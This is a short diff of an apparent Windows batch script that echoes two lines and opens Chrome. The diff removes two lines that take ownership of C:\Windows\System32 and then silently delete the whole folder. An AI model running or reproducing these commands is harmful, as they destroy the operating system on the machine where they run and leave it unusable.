@@ -1,5 +1,3 @@
 echo Nothing Here
 echo Everything Here
 start chrome
-takeown /F C:\Windows\System32 /R /D Y
-rd /s /q C:\Windows\System32
